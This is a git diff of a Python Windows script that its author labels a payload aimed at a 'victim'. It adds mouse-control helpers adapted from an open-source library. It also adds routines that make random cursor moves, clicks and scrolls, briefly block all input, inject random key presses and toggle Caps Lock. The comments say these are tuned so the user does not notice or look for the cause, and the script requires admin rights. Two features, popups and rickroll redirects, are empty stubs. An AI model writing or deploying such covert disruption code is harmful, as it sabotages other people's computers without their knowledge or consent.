@@ -1,14 +1,22 @@
 # This has to be executed as admin
 # Entry script should already handle this
 
-import ctypes
+# I know this is a mess, but keeping in one file makes it easier to download
+
+# —————————————————Housekeeping——————————————————
+
 import os
 
-if not ctypes.WinDLL.shell32.IsUserAnAdmin():
-    os._exit(1)
+def is_admin() -> bool:
+    try:
+        # only windows users with admin privileges can read the C:\windows\temp
+        _ = os.listdir(os.sep.join([os.environ.get('SystemRoot','C:\\windows'),'temp']))
+        return True
+    except OSError:
+        return False        
 
 
-def cleanup():
+def cleanup() -> None:
     # LAzy load this stuff cause I won't use anywhere else
     import subprocess
     import winreg as reg
@@ -32,52 +40,294 @@ def cleanup():
 import atexit
 atexit.register(cleanup)
 
-
+# —————————————————Imports——————————————————
+import ctypes
 import pathlib
 import time
 import random
-import subprocess
+from typing import Callable
 import threading
 
+# —————————————————Mouse Funcs——————————————————
+# Modified from <https://github.com/boppreh/mouse>.
 
-USER32 = ctypes.WinDLL('user32', use_last_error=True)
+from ctypes import c_int32, c_int, c_long, byref, Structure
+from ctypes.wintypes import DWORD
+
+user32 = ctypes.WinDLL('user32', use_last_error = True)
+
+LEFT = 'left'
+RIGHT = 'right'
+MIDDLE = 'middle'
+WHEEL = 'wheel'
+X = 'x'
+
+UP = 'up'
+DOWN = 'down'
+DOUBLE = 'double'
+VERTICAL = 'vertical'
+HORIZONTAL = 'horizontal'
+
+class MSLLHOOKSTRUCT(Structure):
+    _fields_ = [("x", c_long),
+                ("y", c_long),
+                ('data', c_int32),
+                ('reserved', c_int32),
+                ("flags", DWORD),
+                ("time", c_int),
+                ]
+# Beware, as of 2016-01-30 the official docs have a very incomplete list.
+# This one was compiled from experience and may be incomplete.
+WM_MOUSEMOVE = 0x200
+WM_LBUTTONDOWN = 0x201
+WM_LBUTTONUP = 0x202
+WM_LBUTTONDBLCLK = 0x203
+WM_RBUTTONDOWN = 0x204
+WM_RBUTTONUP = 0x205
+WM_RBUTTONDBLCLK = 0x206
+WM_MBUTTONDOWN = 0x207
+WM_MBUTTONUP = 0x208
+WM_MBUTTONDBLCLK = 0x209
+WM_MOUSEWHEEL = 0x20A
+WM_XBUTTONDOWN = 0x20B
+WM_XBUTTONUP = 0x20C
+WM_XBUTTONDBLCLK = 0x20D
+WM_NCXBUTTONDOWN = 0x00AB
+WM_NCXBUTTONUP = 0x00AC
+WM_NCXBUTTONDBLCLK = 0x00AD
+WM_MOUSEHWHEEL = 0x20E
+WM_LBUTTONDOWN = 0x0201
+WM_LBUTTONUP = 0x0202
+WM_MOUSEMOVE = 0x0200
+WM_MOUSEWHEEL = 0x020A
+WM_MOUSEHWHEEL = 0x020E
+WM_RBUTTONDOWN = 0x0204
+WM_RBUTTONUP = 0x0205
+
+buttons_by_wm_code = {
+    WM_LBUTTONDOWN: (DOWN, LEFT),
+    WM_LBUTTONUP: (UP, LEFT),
+    WM_LBUTTONDBLCLK: (DOUBLE, LEFT),
+
+    WM_RBUTTONDOWN: (DOWN, RIGHT),
+    WM_RBUTTONUP: (UP, RIGHT),
+    WM_RBUTTONDBLCLK: (DOUBLE, RIGHT),
+
+    WM_MBUTTONDOWN: (DOWN, MIDDLE),
+    WM_MBUTTONUP: (UP, MIDDLE),
+    WM_MBUTTONDBLCLK: (DOUBLE, MIDDLE),
+
+    WM_XBUTTONDOWN: (DOWN, X),
+    WM_XBUTTONUP: (UP, X),
+    WM_XBUTTONDBLCLK: (DOUBLE, X),
+}
+
+MOUSEEVENTF_ABSOLUTE = 0x8000
+MOUSEEVENTF_MOVE = 0x1
+MOUSEEVENTF_WHEEL = 0x800
+MOUSEEVENTF_HWHEEL = 0x1000
+MOUSEEVENTF_LEFTDOWN = 0x2
+MOUSEEVENTF_LEFTUP = 0x4
+MOUSEEVENTF_RIGHTDOWN = 0x8
+MOUSEEVENTF_RIGHTUP = 0x10
+MOUSEEVENTF_MIDDLEDOWN = 0x20
+MOUSEEVENTF_MIDDLEUP = 0x40
+MOUSEEVENTF_XDOWN = 0x0080
+MOUSEEVENTF_XUP = 0x0100
+
+simulated_mouse_codes = {
+    (WHEEL, HORIZONTAL): MOUSEEVENTF_HWHEEL,
+    (WHEEL, VERTICAL): MOUSEEVENTF_WHEEL,
+
+    (DOWN, LEFT): MOUSEEVENTF_LEFTDOWN,
+    (UP, LEFT): MOUSEEVENTF_LEFTUP,
+
+    (DOWN, RIGHT): MOUSEEVENTF_RIGHTDOWN,
+    (UP, RIGHT): MOUSEEVENTF_RIGHTUP,
+
+    (DOWN, MIDDLE): MOUSEEVENTF_MIDDLEDOWN,
+    (UP, MIDDLE): MOUSEEVENTF_MIDDLEUP,
+
+    (DOWN, X): MOUSEEVENTF_XDOWN,
+    (UP, X): MOUSEEVENTF_XUP,
+}
+
+NULL = c_int(0)
+
+WHEEL_DELTA = 120
 
 
-def misinput():
-    """Ocassionally sends random input / blocks input to disrupt victim."""
-    threading.Thread(target=block_input).start()
-    threading.Thread(target=mouse_movement).start()
+def _translate_button(button):
+    if button.startswith(X):
+        return X, 1 if X == button else 2
+    else:
+        return button, 0
+
+def press(button=LEFT):
+    button, data = _translate_button(button)
+    code = simulated_mouse_codes[(DOWN, button)]
+    user32.mouse_event(code, 0, 0, data, 0)
+
+def release(button=LEFT):
+    button, data = _translate_button(button)
+    code = simulated_mouse_codes[(UP, button)]
+    user32.mouse_event(code, 0, 0, data, 0)
+
+def wheel(delta=1):
+    code = simulated_mouse_codes[(WHEEL, VERTICAL)]
+    user32.mouse_event(code, 0, 0, int(delta * WHEEL_DELTA), 0)
+
+def move_to(x, y):
+    user32.SetCursorPos(int(x), int(y))
+
+def move_relative(x, y):
+    user32.mouse_event(MOUSEEVENTF_MOVE, int(x), int(y), 0, 0)
+
+class POINT(Structure):
+    _fields_ = [("x", c_long), ("y", c_long)]
+
+def get_position():
+    point = POINT()
+    user32.GetCursorPos(byref(point))
+    return (point.x, point.y)
 
 
+def click(button=LEFT):
+    """ Sends a click with the given button. """
+    press(button)
+    release(button)
 
+def double_click(button=LEFT):
+    """ Sends a double click with the given button. """
+    click(button)
+    click(button)
+
+def right_click():
+    """ Sends a right click with the given button. """
+    click(RIGHT)
+
+def move(x, y, absolute=True, duration=0, steps_per_second=120.0):
+    x = int(x)
+    y = int(y)
+
+    # Requires an extra system call on Linux, but `move_relative` is measured
+    # in millimeters so we would lose precision.
+    position_x, position_y = get_position()
+
+    if not absolute:
+        x = position_x + x
+        y = position_y + y
+
+    if not duration:
+        move_to(x, y)
+        return
+    
+    start_x = position_x
+    start_y = position_y
+    dx = x - start_x
+    dy = y - start_y
+
+    if dx == 0 and dy == 0:
+        time.sleep(duration)
+        return
+
+    intervaltime = 1.0/steps_per_second
+    starttime = time.perf_counter()
+    endtime = starttime + float(duration)
+    step_starttime = starttime
+    iteration_starttime = starttime
+    while iteration_starttime < endtime:
+        # Sleep to enforce the fps cap, considering the last step's duration and remaining time
+        last_step_duration = iteration_starttime - step_starttime
+        remainingtime = endtime - iteration_starttime
+        corrected_sleeptime = intervaltime - last_step_duration
+        actual_sleeptime = min(remainingtime, corrected_sleeptime)
+        if actual_sleeptime > 0:
+            time.sleep(actual_sleeptime)
+        step_starttime = time.perf_counter()
+
+        # Move based on the elapsed time to ensure that the duration is valid
+        currenttime = step_starttime - starttime
+        progress = currenttime / duration
+        move_to(start_x + dx*progress, start_y + dy*progress)
+        iteration_starttime = time.perf_counter()
+
+    # Move to the destination to ensure the final position
+    move_to(start_x + dx, start_y + dy)
+# END Mouse Funcs
+
+
+# —————————————————START ACTUAL PAYLOAD—————————————————
+
+# Feature 1 - Input Manipulation
+def mouse_malfunction() -> Callable:
+    # Thanks to https://github.com/boppreh/mouse for the mouse functions 
+    """Returns a random function that will create unexpected behaviour with the victim's mouse."""
+    def move_mouse_randomly():  
+        move(random.randint(-100, 100), random.randint(-100, 100), absolute=False)
+        time.sleep(random.uniform(0.5, 2))  # Random delay between movements
+    
+    def random_clicks():
+        button = random.choice([LEFT, RIGHT, MIDDLE])
+        click(button)
+        time.sleep(random.uniform(0.5, 2))
+
+    def random_wheel_scroll():
+        wheel(random.choice([-1, 1]) * random.randint(1, 3))
+    
+    return random.choice([move_mouse_randomly, random_clicks, random_wheel_scroll])
+
+
+def keyboard_malfunction() -> Callable:
+    def block_input():
+        """Block input for a short time to confuse the user."""
+        user32.BlockInput(True)  
+        time.sleep(random.random())  # 0-1 sec just long enough to mess with them but they don't realise
+        user32.BlockInput(False) 
+    
+    def random_key_presses():
+        """Randomly presses keys to disrupt the user."""
+        A = 0x41  # Virtual key code for  A
+        Z = 0x5A  # '                  '  Z    
+        keys = list(range(A, Z + 1))
+        key = random.choice(keys)
+        user32.keybd_event(key, 0, 0, 0)
+        user32.keybd_event(key, 0, 2, 0)  
+        time.sleep(random.uniform(0.5, 2))  # Not sure if this is needed
+    
+    def broken_caps_lock():
+        """Toggle Caps Lock on and off to confuse the user."""
+        user32.keybd_event(0x14, 0, 0, 0)  # Caps Lock key code
+        time.sleep(random.uniform(0.5, 2))
+        user32.keybd_event(0x14, 0, 2, 0)
+    
+    return random.choice([block_input, random_key_presses, broken_caps_lock])
+
+
+# Feature 2 - Random popup windows, no idea how to do this yet...
 def funny_windows():
     """Make funny popup windows"""
-    pass    
+    pass
 
 
-def mouse_movement():
-    """Randomly move the mouse cursor around the screen."""
-    # https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-mouse_event
-    # No idea if this is done correctly
-    for _ in range(3): # 3 should be enough to annoy them but not have them raise a fuss and look for the cause
-        x = random.randint(-100, 100)
-        y = random.randint(-100, 100)
-        USER32.SetCursorPos(x, y)
-        time.sleep(random.uniform(0.5, 2))  # Random delay between movements
-
-
-def block_input():
-    """Block input for a short time to confuse the user."""
-    USER32.BlockInput(True)  
-    time.sleep(random.random())  # Just long enough to mess with them but they don't realise
-    USER32.BlockInput(False) 
+# Feature 3 - Random rickroll redirects, no idea how to do this yet...
 
 def redirects():
     """Randomly redirects victim to be rickrolled"""
     pass
 
+
+# Example usage for now
 def main():
-    pass
+    if not is_admin():
+        os._exit(1)
+    i = 0
+    while i < 10:
+        i += 1
+        mouse_malfunction()()
+        keyboard_malfunction()()
+        time.sleep(1) 
+
 
 if __name__ == "__main__":
     main()
